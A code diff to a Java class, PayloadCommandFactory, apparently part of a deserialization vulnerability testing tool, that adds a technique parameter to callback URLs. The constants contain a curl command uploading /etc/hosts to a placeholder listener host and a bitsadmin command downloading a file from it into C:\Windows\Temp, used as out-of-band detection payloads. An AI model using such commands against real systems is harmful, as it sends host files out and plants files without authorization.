@@ -11,7 +11,7 @@
 	Hashtable keys:
 		cmd (command to run)
 		os (operating system that command is intended for (if not provided when command is created, this will be automatically set to "Unknown"))
-		prot (protocol used to talk back to Node: currently only supports "web" (HTTP))
+		prot (protocol used to talk back to Node: currently only supports "web" (HTTP not HTTPS))
 		upload (whether command will upload a file to the Node (true) or simply access the Node (false))
 */
 
@@ -34,8 +34,8 @@ public class PayloadCommandFactory {
 	//default settings
 	private static final String LINUX_OS = "Linux";
 	private static final String WIN_OS = "Windows";
-	private static final String LINUX_CURL_PASSWD = "curl -X PUT --data-binary @/etc/hosts [NODEPROTOCOL]://[NODEHOST]:[NODEPORT][NODEPATH]?token=[NODETOKEN]";
-	private static final String WIN_BITSADMIN = "bitsadmin /transfer SuperSerialJob /download /priority high [NODEPROTOCOL]://[NODEHOST]:[NODEPORT][NODEPATH]?token=[NODETOKEN]&write=true C:\\Windows\\Temp\\superserial.txt"; //TODO: Add random string to job name (to avoid failed detection due to duplicate job names)
+	private static final String LINUX_CURL_PASSWD = "curl -X PUT --data-binary @/etc/hosts [NODEPROTOCOL]://[NODEHOST]:[NODEPORT][NODEPATH]?token=[NODETOKEN]&technique=[TECHNIQUE]";
+	private static final String WIN_BITSADMIN = "bitsadmin /transfer SuperSerialJob /download /priority high [NODEPROTOCOL]://[NODEHOST]:[NODEPORT][NODEPATH]?token=[NODETOKEN]&write=true&technique=[TECHNIQUE] C:\\Windows\\Temp\\superserial.txt"; //TODO: Add random string to job name (to avoid failed detection due to duplicate job names)
 	private static final String LINUX_PING = "ping -c 4 [NODEHOST]"; //not used
 	private static final String WIN_PING = "ping -n 4 [NODEHOST]"; //not used
 	
